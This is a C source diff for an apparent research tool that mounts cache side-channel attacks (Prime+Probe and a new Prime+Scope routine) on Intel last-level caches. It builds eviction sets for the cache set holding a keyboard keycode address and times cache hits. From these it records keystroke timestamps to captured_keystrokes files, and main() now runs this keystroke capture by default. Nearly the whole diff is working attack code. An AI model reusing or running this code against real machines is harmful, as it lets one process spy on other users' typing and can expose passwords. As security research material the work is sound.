@@ -17,6 +17,9 @@
 
 #define TRIALS 1000
 
+#define PRIME_PROBE 0
+#define PRIME_SCOPE 1
+
 void *mapping_start;
 EvictionSet **es_list;
 unsigned int core_id = 0;
@@ -149,9 +152,8 @@ uint64_t *profile_slices(int set) {
 
   sleep(5);
   int slice_hit_count[4];
-  uint8_t hit_times[1024 * 1024];
   uint64_t timestamps[64 * 64];
-  char filename[20];
+  char filename[30];
 
   uint64_t *size = malloc(4 * sizeof(uint64_t));
   int threshold = threshold_from_flush((void *)es_list[0]->head);
@@ -160,9 +162,8 @@ uint64_t *profile_slices(int set) {
   for (int i = 0; i < 4; i++) {
     int slice = get_i7_2600_slice(pointer_to_pa((void *)es_list[i]->head));
     printf("testing slice index: %d\n", slice);
-    size[slice] = prime_probe(es_list[i], EVERGLADES_ASSOCIATIVITY, hit_times,
-                              1024 * 1024, timestamps, threshold);
-    print_probe_result(hit_times, 1024 * 1024, 64, 64);
+    size[slice] = prime_probe(es_list[i], EVERGLADES_ASSOCIATIVITY, timestamps,
+                              64 * 64, threshold);
     sprintf(filename, "output%d.bin", slice);
     flush_timestamps(timestamps, size[slice], filename);
   }
@@ -174,7 +175,6 @@ uint64_t measure_keystroke(int threshold) {
   int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
   int slice = get_i7_2600_slice(KBD_KEYCODE_ADDR);
   int eslist_index = get_evset_index(slice);
-  uint8_t probemap[1024 * 1024];
   uint64_t keystrokes[64 * 64];
 
   uint64_t num_keystrokes = 0;
@@ -184,43 +184,12 @@ uint64_t measure_keystroke(int threshold) {
   for (int i = 0; i < 10; i++) {
     // takes around 1s to fill up 1 MB buffer
     uint64_t size = prime_probe(es_list[eslist_index], EVERGLADES_ASSOCIATIVITY,
-                                probemap, 1024 * 1024, keystrokes, threshold);
+                                keystrokes, 64 * 64, threshold);
     flush_timestamps(keystrokes, size, "pp_keystrokes.bin");
     num_keystrokes += size;
   }
   printf("\nnum_keystrokes: %lu\n", num_keystrokes);
   return start_time;
-}
-
-void measure_keystroke_without_slice(int threshold) {
-  int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
-  uint8_t probemap[4][1024 * 1024];
-  uint64_t keystrokes[4][64 * 64];
-  uint64_t total_strokes[4];
-
-  char filename[20];
-  uint64_t start_time = __rdtscp(&core_id);
-  for (int i = 0; i < 4; i++) {
-    total_strokes[i] = 0;
-    sprintf(filename, "pp_keystrokes_%d.bin", i);
-    flush_timestamps(&start_time, 1, filename);
-  }
-
-  printf("please start typing\n");
-  for (int i = 0; i < 3; i++) {
-    uint64_t *num_strokes = prime_probe_many_sets(
-        es_list, EVERGLADES_NUM_SLICES, EVERGLADES_ASSOCIATIVITY, 1024 * 1024,
-        probemap, 64 * 64, keystrokes, threshold);
-    for (int j = 0; j < 4; j++) {
-      sprintf(filename, "pp_keystrokes_%d.bin", j);
-      flush_timestamps(keystrokes[j], num_strokes[j], filename);
-      total_strokes[j] += num_strokes[j];
-    }
-    free(num_strokes);
-  }
-  for (int i = 0; i < 4; i++) {
-    printf("%lu\n", total_strokes[i]);
-  }
 }
 
 void prep(EvictionSet *evset) {
@@ -239,6 +208,102 @@ void prep(EvictionSet *evset) {
     }
   }
   _mm_prefetch(evset->head, _MM_HINT_NTA);
+}
+
+uint64_t *prime_scope_many_sets(EvictionSet **es_list, int num_sets,
+                                int associativity, int size,
+                                uint64_t detect_timestamps[num_sets][size],
+                                int threshold) {
+
+  unsigned int core_id = 0;
+
+  int prev[num_sets];
+  int current[num_sets];
+  uint64_t *hit_count = malloc(num_sets * sizeof(uint64_t));
+  for (int i = 0; i < num_sets; i++) {
+    prev[i] = 0;
+    current[i] = 0;
+    hit_count[i] = 0;
+  }
+
+  // prime step for all sets
+  for (int i = 0; i < num_sets; i++) {
+    prep(es_list[i]);
+  }
+
+  // compute second based on number of sets
+  uint64_t SECOND = 1024 * 1024 / num_sets;
+
+  // prime and probe each set
+  for (int i = 0; i < SECOND; i++) {
+    for (int j = 0; j < num_sets; j++) {
+      prep(es_list[j]);
+      uint64_t start = __rdtscp(&core_id);
+      while (__rdtscp(&core_id) - start < 5000)
+        ;
+      current[j] = time_load((uint8_t *)es_list[j]->head) > threshold;
+      if (current[j] == 1 && prev[j] == 1) {
+        current[j] = 0;
+        prev[j] = 1;
+      } else if (current[j] == 1) {
+        detect_timestamps[j][hit_count[j]] = __rdtscp(&core_id);
+        hit_count[j]++;
+        prev[j] = 1;
+      } else {
+        prev[j] = 0;
+      }
+    }
+  }
+  return hit_count;
+}
+
+void measure_keystroke_without_slice(int num_slices, int seconds,
+                                     int max_detections, int threshold,
+                                     int attack_type) {
+  int set = (KBD_KEYCODE_ADDR >> LINE_OFFSET_BITS) &
+            ((1 << KABYLAKE_CACHE_SET_BITS) - 1);
+
+  printf("set: %d\n", set);
+
+  uint64_t keystrokes[num_slices][max_detections];
+  uint64_t total_strokes[num_slices];
+
+  char filename[30]; // buffer to store output filename
+
+  // store initial timestamp for each file
+  uint64_t start_time = __rdtscp(&core_id);
+  for (int i = 0; i < num_slices; i++) {
+    total_strokes[i] = 0;
+    sprintf(filename, "captured_keystrokes_%c.bin", i + '0');
+    flush_timestamps(&start_time, 1, filename);
+  }
+
+  // start measurement for keystrokes
+  printf("please start typing\n");
+  for (int i = 0; i < seconds; i++) { // each iteration is 8 seconds
+    uint64_t *num_strokes;
+    if (attack_type == PRIME_PROBE) {
+      num_strokes = prime_probe_many_sets(
+          es_list, KABYLAKE_NUM_SLICES, KABYLAKE_ASSOCIATIVITY, max_detections,
+          keystrokes, threshold);
+    } else {
+      num_strokes = prime_scope_many_sets(
+          es_list, KABYLAKE_NUM_SLICES, KABYLAKE_ASSOCIATIVITY, max_detections,
+          keystrokes, threshold);
+    }
+
+    for (int j = 0; j < num_slices; j++) {
+      sprintf(filename, "captured_keystrokes_%c.bin", j + '0');
+      flush_timestamps(keystrokes[j], num_strokes[j], filename);
+      total_strokes[j] += num_strokes[j];
+    }
+    free(num_strokes);
+  }
+
+  // output number of keystrokes for
+  for (int i = 0; i < num_slices; i++) {
+    printf("%lu\n", total_strokes[i]);
+  }
 }
 
 void prime_scope_tests(EvictionSet *evset, int threshold, int set) {
@@ -337,31 +402,13 @@ void prime_scope_tests(EvictionSet *evset, int threshold, int set) {
   }
 }
 
-int main() {
+uint64_t get_prep_duration(EvictionSet *evset) {
+  uint64_t start = __rdtscp(&core_id);
+  prep(evset);
+  return __rdtscp(&core_id) - start;
+}
 
-  init_mapping();
-  int threshold = threshold_from_flush(mapping_start);
-  CacheLineSet *cl_set = new_cl_set();
-  if (!get_minimal_set((mapping_start + (31 << LINE_OFFSET_BITS)), &cl_set,
-                       threshold)) {
-    printf("Failed to find minimal eviction set for the given target\n");
-  }
-
-  EvictionSet *evset = new_eviction_set(cl_set);
-  printf("done test setup and start measuring\n");
-  sleep(5);
-
-  prime_scope_tests(evset, threshold, 31);
-
-  printf("prep cycles: ");
-  for (int i = 0; i < 10; i++) {
-    uint64_t start = __rdtscp(&core_id);
-    prep(evset);
-    int duration = __rdtscp(&core_id) - start;
-    printf("%d ", duration);
-  }
-  printf("\n");
-
+void within_process_transmit_test(EvictionSet *evset, int threshold) {
   uint8_t probemap[128];
   for (int i = 0; i < 128; i++) {
     probemap[i] = 0;
@@ -371,10 +418,8 @@ int main() {
   int total_hit = 0;
 
   for (int i = 0; i < 128; i++) {
-    // prep(evset);
     for (int j = 0; j < 128; j++) {
       int index = i * 128 + j;
-      // if (prev)
       prep(evset);
       if (index % 8 == 0) {
         volatile uint8_t x =
@@ -396,25 +441,21 @@ int main() {
   printf("correct-hit rate: %lf\n", (correct_hit) / (double)(128 * 128 / 8));
   printf("false-positive rate: %lf\n",
          (double)(total_hit - correct_hit) / (128 * 128));
+}
 
+void cross_process_transmit_test(EvictionSet *evset, int threshold) {
+  printf("done test setup and start measuring\n");
+  sleep(5);
   char detect_map[128][128];
   for (int i = 0; i < 128; i++) {
-    // prep(evset);
     for (int j = 0; j < 128; j++) {
       int index = i * 128 + j;
-      // if (prev)
       prep(evset);
-      // if (index % 8 == 0) {
-      //   volatile uint8_t x =
-      //       *(volatile uint8_t *)(mapping_start + (31 << LINE_OFFSET_BITS));
-      // }
       uint64_t start = __rdtscp(&core_id);
       while (__rdtscp(&core_id) - start < 5000)
         ;
       int access_time = time_load((uint8_t *)evset->head);
-      prev = access_time > threshold;
-      detect_map[i][j] = prev;
-      total_hit += prev;
+      detect_map[i][j] = access_time > threshold;
     }
   }
 
@@ -424,41 +465,51 @@ int main() {
     }
     printf("\n");
   }
-  // for (int i = 0; i < 64; i++) {
-  //   for (int j = 0; j < 64; j++) {
-  //     printf("%d", probemap[128 * 128 - 64 * 64 + i * 64 + j]);
-  //   }
-  //   printf("\n");
-  // }
-  deep_free_es(evset);
+}
 
-  // uint8_t probemap[KABYLAKE_NUM_SLICES][512 * 512];
-  // uint64_t keystrokes[10][10];
-  //
-  // es_list = get_all_slices_eviction_sets(mapping_start, 428);
-  // printf("eviction set found, please start the victim program\n");
-  // sleep(5);
-  //
-  // uint64_t *hit_count = prime_probe_many_sets(
-  //     es_list, KABYLAKE_NUM_SLICES, KABYLAKE_ASSOCIATIVITY, 512 * 512,
-  //     probemap, 10 * 10, keystrokes, threshold);
-  // free(hit_count);
-  //
-  // for (int i = 0; i < 8; i++) {
-  //   printf("--------------------------------------- slice %d "
-  //          "------------------------------\n",
-  //          i);
-  //   for (int j = 0; j < 64; j++) {
-  //     for (int k = 0; k < 64; k++) {
-  //       printf("%d ", probemap[i][512 * 512 - 64 * 64 + j * 64 + k]);
-  //     }
-  //     printf("\n");
-  //   }
-  //   printf("\n");
-  // }
+int main(int argc, char **argv) {
 
-  // measure_keystroke(threshold_from_flush(mapping_start));
-  // free_es_list(es_list);
+  init_mapping();
+  int threshold = threshold_from_flush(mapping_start);
+
+  /* Prime+Scope tests */
+  // TODO: Convert Prime+Scope to do Keystroke Timing
+  //
+  // CacheLineSet *cl_set = new_cl_set();
+  // if (!get_minimal_set((mapping_start + (249 << LINE_OFFSET_BITS)), &cl_set,
+  //                      threshold)) {
+  //   printf("Failed to find minimal eviction set for the given target\n");
+  // }
+  //
+  // EvictionSet *evset = new_eviction_set(cl_set);
+  //
+  // prime_scope_tests(evset, threshold, 249);
+  // uint64_t prep_duration = get_prep_duration(evset);
+  // within_process_transmit_test(evset, threshold);
+  // cross_process_transmit_test(evset, threshold);
+  //
+  // deep_free_es(evset);
+
+  /* Prime+Probe Keystroke Timing */
+
+  uint64_t keystrokes[KABYLAKE_NUM_SLICES][4096];
+  int set = (KBD_KEYCODE_ADDR >> LINE_OFFSET_BITS) &
+            ((1 << KABYLAKE_CACHE_SET_BITS) - 1);
+  printf("%d\n", set);
+
+  es_list = get_all_slices_eviction_sets(mapping_start, set);
+  printf("eviction set found, please start typing\n");
+
+  int attack_type = PRIME_PROBE;
+  if (argc == 2 && !strcmp(argv[1], "ps")) {
+    printf("%s\n", argv[1]);
+    attack_type = PRIME_SCOPE;
+  }
+
+  measure_keystroke_without_slice(KABYLAKE_NUM_SLICES, 20, 4096, threshold,
+                                  attack_type);
+
+  free_es_list(es_list);
   munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
   return 0;
 }
